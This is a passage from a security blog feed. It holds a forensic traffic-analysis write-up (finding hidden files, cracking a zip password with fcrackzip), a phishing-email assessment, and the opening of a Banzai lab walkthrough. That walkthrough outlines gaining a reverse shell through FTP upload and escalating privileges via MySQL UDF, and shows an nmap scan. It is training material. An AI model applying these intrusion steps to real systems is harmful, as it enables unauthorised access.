&lt;/ol&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/2.png&quot; title=&quot;ANZ_Digital_Forensics/2.png&quot; alt=&quot;ANZ_Digital_Forensics/2.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Here are the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;md5&lt;/code&gt; hashes of those images after they were downloaded:&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/3.png&quot; title=&quot;ANZ_Digital_Forensics/3.png&quot; alt=&quot;ANZ_Digital_Forensics/3.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Analysing those images, I was able to spot a few dubious points.&lt;/p&gt;

&lt;h4 id=&quot;sub-task-1&quot;&gt;&lt;strong&gt;Sub-task 1&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anz-logo.jpg&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bank-card.jpg&lt;/code&gt; are two images that show up in the users network traffic. Opened those images with an Image Viewer application, I obtained the following results.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anz-logo.jpg&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/4.png&quot; title=&quot;ANZ_Digital_Forensics/4.png&quot; alt=&quot;ANZ_Digital_Forensics/4.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bank-card.jpg&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/5.png&quot; title=&quot;ANZ_Digital_Forensics/5.png&quot; alt=&quot;ANZ_Digital_Forensics/5.png&quot; /&gt;
          &lt;/div&gt;

&lt;h4 id=&quot;sub-task-2&quot;&gt;&lt;strong&gt;Sub-task 2&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;The network traffic for the images &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ1.jpg&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ2.jpg&lt;/code&gt; is more than it appears.&lt;/li&gt;
  &lt;li&gt;Employing a tool called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt; against the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ1.jpg&lt;/code&gt;, I discovered a hidden message.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/6.png&quot; title=&quot;ANZ_Digital_Forensics/6.png&quot; alt=&quot;ANZ_Digital_Forensics/6.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;I achieved the same result by inspecting the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp stream 14”&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The Wireshark filter query is: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp.stream eq 14&lt;/code&gt; -&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Follow TCP Stream&lt;/code&gt;. At the end of the stream, the hidden message showed up.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/7.png&quot; title=&quot;ANZ_Digital_Forensics/7.png&quot; alt=&quot;ANZ_Digital_Forensics/7.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Open the image with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HxD&lt;/code&gt; application, I could also retain the same output.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/hxd.png&quot; title=&quot;ANZ_Digital_Forensics/hxd.png&quot; alt=&quot;ANZ_Digital_Forensics/hxd.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;I followed the same techniques with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ2.jpg&lt;/code&gt; image and managed to allocate the hidden messages shown as below.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/8.png&quot; title=&quot;ANZ_Digital_Forensics/8.png&quot; alt=&quot;ANZ_Digital_Forensics/8.png&quot; /&gt;
          &lt;/div&gt;

&lt;h4 id=&quot;sub-task-3&quot;&gt;&lt;strong&gt;Sub-task 3&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;how-to-commit-crimes.docx&lt;/code&gt; file type is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASCII&lt;/code&gt;. I could confirm that with the  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; command.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/9.png&quot; title=&quot;ANZ_Digital_Forensics/9.png&quot; alt=&quot;ANZ_Digital_Forensics/9.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Here is how the content looks like on the wire.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/10.png&quot; title=&quot;ANZ_Digital_Forensics/10.png&quot; alt=&quot;ANZ_Digital_Forensics/10.png&quot; /&gt;
          &lt;/div&gt;

&lt;h4 id=&quot;sub-task-4&quot;&gt;&lt;strong&gt;Sub-task 4&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;The user accessed three pdf documents: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ_Document.pdf&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ_Document2.pdf&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil.pdf&lt;/code&gt;. Inspecting those &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.pdf&lt;/code&gt; respectively …&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ_Document.pdf&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/11.png&quot; title=&quot;ANZ_Digital_Forensics/11.png&quot; alt=&quot;ANZ_Digital_Forensics/11.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ_Document2.pdf&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/12.png&quot; title=&quot;ANZ_Digital_Forensics/12.png&quot; alt=&quot;ANZ_Digital_Forensics/12.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil.pdf&lt;/code&gt; file is suspicious with the following contents.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/13.png&quot; title=&quot;ANZ_Digital_Forensics/13.png&quot; alt=&quot;ANZ_Digital_Forensics/13.png&quot; /&gt;
          &lt;/div&gt;

&lt;h4 id=&quot;sub-task-5&quot;&gt;&lt;strong&gt;Sub-task 5&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hiddenmessage2.txt&lt;/code&gt; file is actually a JPG image. This could be confirmed with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JFIF&lt;/code&gt; file signature.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/14.png&quot; title=&quot;ANZ_Digital_Forensics/14.png&quot; alt=&quot;ANZ_Digital_Forensics/14.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;By changing the file extension to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hiddenmessage2.jpg&lt;/code&gt;. Here is how it looks like.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/15.png&quot; title=&quot;ANZ_Digital_Forensics/15.png&quot; alt=&quot;ANZ_Digital_Forensics/15.png&quot; /&gt;
          &lt;/div&gt;

&lt;h4 id=&quot;sub-task-6&quot;&gt;&lt;strong&gt;Sub-task 6&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;A hidden image is embedded in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;atm-image.jpg&lt;/code&gt;. I could confirm that by inspecting the file stream with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/16.png&quot; title=&quot;ANZ_Digital_Forensics/16.png&quot; alt=&quot;ANZ_Digital_Forensics/16.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Scrolling down a little bit, I found the second &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JFIF&lt;/code&gt; file signature.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/17.png&quot; title=&quot;ANZ_Digital_Forensics/17.png&quot; alt=&quot;ANZ_Digital_Forensics/17.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Extracting the second image with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foremost&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/18.png&quot; title=&quot;ANZ_Digital_Forensics/18.png&quot; alt=&quot;ANZ_Digital_Forensics/18.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Here is how it looks like.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/19.png&quot; title=&quot;ANZ_Digital_Forensics/19.png&quot; alt=&quot;ANZ_Digital_Forensics/19.png&quot; /&gt;
          &lt;/div&gt;

&lt;h4 id=&quot;sub-task-7&quot;&gt;&lt;strong&gt;Sub-task 7&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;broken.png&lt;/code&gt; file content is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64-encoded&lt;/code&gt;. I decoded the content, and took a look at the file header, it appears to be a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PNG&lt;/code&gt; image.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/20.png&quot; title=&quot;ANZ_Digital_Forensics/20.png&quot; alt=&quot;ANZ_Digital_Forensics/20.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;I simply redirected the decoded content of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;broken.png&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;broken_recover.png&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Here is how the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;broken_recover.png&lt;/code&gt; image looks like when its recovered.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/21.png&quot; title=&quot;ANZ_Digital_Forensics/21.png&quot; alt=&quot;ANZ_Digital_Forensics/21.png&quot; /&gt;
          &lt;/div&gt;

&lt;h4 id=&quot;sub-task-8&quot;&gt;&lt;strong&gt;Sub-task 8&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;securepdf.pdf&lt;/code&gt; is a actually a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.zip&lt;/code&gt; file. Once again, I could state that by checking the file type with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/22.png&quot; title=&quot;ANZ_Digital_Forensics/22.png&quot; alt=&quot;ANZ_Digital_Forensics/22.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Extract the zip, I was prompted to enter a password.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/23.png&quot; title=&quot;ANZ_Digital_Forensics/23.png&quot; alt=&quot;ANZ_Digital_Forensics/23.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Crack the zip with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fcrackzip&lt;/code&gt;, the yielded password is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secure&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/24.png&quot; title=&quot;ANZ_Digital_Forensics/24.png&quot; alt=&quot;ANZ_Digital_Forensics/24.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Extract the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zip&lt;/code&gt; with the password of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secure&lt;/code&gt;, I managed to recover the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rawpdf.pdf&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/25.png&quot; title=&quot;ANZ_Digital_Forensics/25.png&quot; alt=&quot;ANZ_Digital_Forensics/25.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Here is how the file looks like when its recovered.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/26.png&quot; title=&quot;ANZ_Digital_Forensics/26.png&quot; alt=&quot;ANZ_Digital_Forensics/26.png&quot; /&gt;
          &lt;/div&gt;</content><author><name></name></author><category term="traffic_analysis" /><category term="digital_forensics" /><category term="blueteam" /><summary type="html">Task Description</summary></entry><entry><title type="html">Cyber@ANZ - Social Engineering Investigation</title><link href="https://jayngng.github.io/blog/cyberanz-social-engineering-email-analysis/" rel="alternate" type="text/html" title="Cyber@ANZ - Social Engineering Investigation" /><published>2021-09-22T02:13:37+10:00</published><updated>2021-09-22T02:13:37+10:00</updated><id>https://jayngng.github.io/blog/cyberanz---social-engineering-email-analysis</id><content type="html" xml:base="https://jayngng.github.io/blog/cyberanz-social-engineering-email-analysis/">&lt;h2 id=&quot;task-description&quot;&gt;&lt;strong&gt;Task Description&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;You have been assigned &lt;a href=&quot;https://cdn.theforage.com/vinternships/companyassets/AKkAyEwWc8wjPxx9n/Emails%20to%20Investigate.pdf&quot;&gt;7 emails&lt;/a&gt; to investigate. Some of these emails may contain content which can be classed as malicious, due to a number of reasons. They may contain malicious attachments, suspicious links, or Phishing attempts to gather private account information from the user.&lt;/p&gt;

&lt;p&gt;You are expected to report your findings on each email, so that we can either block or release these emails to the users.&lt;/p&gt;

&lt;p&gt;Download Emails: &lt;a href=&quot;https://cdn.theforage.com/vinternships/companyassets/AKkAyEwWc8wjPxx9n/Emails%20to%20Investigate.pdf&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;solutions&quot;&gt;&lt;strong&gt;Solutions&lt;/strong&gt;&lt;/h2&gt;

&lt;h4 id=&quot;email-1&quot;&gt;&lt;strong&gt;Email 1&lt;/strong&gt;&lt;/h4&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Social_Engineering/email1.png&quot; title=&quot;ANZ_Social_Engineering/email1.png&quot; alt=&quot;ANZ_Social_Engineering/email1.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Safe&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The email does not contain a link or attachment.&lt;/li&gt;
  &lt;li&gt;It appears to be a typical conversation between friends.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;email-2&quot;&gt;&lt;strong&gt;Email 2&lt;/strong&gt;&lt;/h4&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Social_Engineering/email2.png&quot; title=&quot;ANZ_Social_Engineering/email2.png&quot; alt=&quot;ANZ_Social_Engineering/email2.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Malicious&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;There is no formal email greeting.&lt;/li&gt;
  &lt;li&gt;The email started with an abnormal “One Drive..” header.&lt;/li&gt;
  &lt;li&gt;Inconsistency in writing. For example, “office 365 Email”.&lt;/li&gt;
  &lt;li&gt;The spelling mistake in “recevie”.&lt;/li&gt;
  &lt;li&gt;The attacker tries to convince the user to click on the “UPDATE YOUR ACCOUNT” leading to an unknown page.&lt;/li&gt;
  &lt;li&gt;The words “ADOBE PDF” and “SECURITY” are unreasonably capitalized.&lt;/li&gt;
  &lt;li&gt;Overall, the email is poorly written, with multiple spelling mistakes and inconsistent formatting. The final purpose is to trick the user into downloading and opening a dubious Adobe PDF file.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;email-3&quot;&gt;&lt;strong&gt;Email 3&lt;/strong&gt;&lt;/h4&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Social_Engineering/email3.png&quot; title=&quot;ANZ_Social_Engineering/email3.png&quot; alt=&quot;ANZ_Social_Engineering/email3.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Malicious&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The address is not legitimate due to the “b” letter and the Top Level Domain (TLD) of “.opt”, which indicates a malicious Facebook website.&lt;/li&gt;
  &lt;li&gt;Overall, the user has been instilled a sense of curiosity to click on a malicious link.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;email-4&quot;&gt;&lt;strong&gt;Email 4&lt;/strong&gt;&lt;/h4&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Social_Engineering/email4.png&quot; title=&quot;ANZ_Social_Engineering/email4.png&quot; alt=&quot;ANZ_Social_Engineering/email4.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Malicious/Spam&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;By inspecting the header information, we discover that the email is initially from Massdrop and is then forwarded by Adam.&lt;/li&gt;
  &lt;li&gt;The email is written inconsistently, with some grammar errors in “a new adjustments”.&lt;/li&gt;
  &lt;li&gt;There is potentially a high chance that Adam had modified the original email and the “SEE MORE” link location, which clicking on will redirect the user to land on an unknown website.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;email-5&quot;&gt;&lt;strong&gt;Email 5&lt;/strong&gt;&lt;/h4&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Social_Engineering/email5.png&quot; title=&quot;ANZ_Social_Engineering/email5.png&quot; alt=&quot;ANZ_Social_Engineering/email5.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Malicious&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The sender does not know the user’s identity. As a result, he/she solely “Hi” without mentioning the user’s name.&lt;/li&gt;
  &lt;li&gt;The email is so generic that it could apply to anyone.&lt;/li&gt;
  &lt;li&gt;The sender tries to instill a sense of urgency to hopefully compromise the user’s credentials.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;email-6&quot;&gt;&lt;strong&gt;Email 6&lt;/strong&gt;&lt;/h4&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Social_Engineering/email6.png&quot; title=&quot;ANZ_Social_Engineering/email6.png&quot; alt=&quot;ANZ_Social_Engineering/email6.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Safe&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Both Reuben and Alan are using ANZ business email.&lt;/li&gt;
  &lt;li&gt;In general, the email looks legitimate and professional, while both the sender and responder seem to be on the same page.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;email-7&quot;&gt;&lt;strong&gt;Email 7&lt;/strong&gt;&lt;/h4&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Social_Engineering/email7.png&quot; title=&quot;ANZ_Social_Engineering/email7.png&quot; alt=&quot;ANZ_Social_Engineering/email7.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Malicious&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The email contains one dubious link leading to a suspicious website.&lt;/li&gt;
  &lt;li&gt;Overall, the marketing email is not professional and lacks information but an address leads to an unknown source.&lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><category term="blueteam" /><category term="socialengineering" /><category term="defense" /><summary type="html">Task Description You have been assigned 7 emails to investigate. Some of these emails may contain content which can be classed as malicious, due to a number of reasons. They may contain malicious attachments, suspicious links, or Phishing attempts to gather private account information from the user.</summary></entry><entry><title type="html">Banzai - OSPG</title><link href="https://jayngng.github.io/blog/banzai-ospg/" rel="alternate" type="text/html" title="Banzai - OSPG" /><published>2021-09-20T19:53:26+10:00</published><updated>2021-09-20T19:53:26+10:00</updated><id>https://jayngng.github.io/blog/banzai---ospg</id><content type="html" xml:base="https://jayngng.github.io/blog/banzai-ospg/">&lt;h1 id=&quot;summary&quot;&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;We’ll obtain the initial access by uploading a reverse shell onto the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; file share and triggering it via a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; web application. We then escalate our privilege by exploiting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MySQL UDF&lt;/code&gt; vulnerability.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;nmap&quot;&gt;&lt;strong&gt;Nmap&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;We’ll begin with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;
PORT     STATE SERVICE    REASON         VERSION
21/tcp   open  ftp        syn-ack ttl 63 vsftpd 3.0.3
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 
25/tcp   open  smtp       syn-ack ttl 63 Postfix smtpd
5432/tcp open  postgresql syn-ack ttl 63 PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.17
8080/tcp open  http       syn-ack ttl 63 Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: 403 Forbidden
8295/tcp open  http       syn-ack ttl 63 Apache httpd 2.4.25 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Banzai
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s us start with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; service.&lt;/p&gt;

&lt;h4 id=&quot;ftp-enumeration&quot;&gt;&lt;strong&gt;FTP Enumeration&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;We’ll utilize &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftp&lt;/code&gt; command to access the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; file share.&lt;/p&gt;

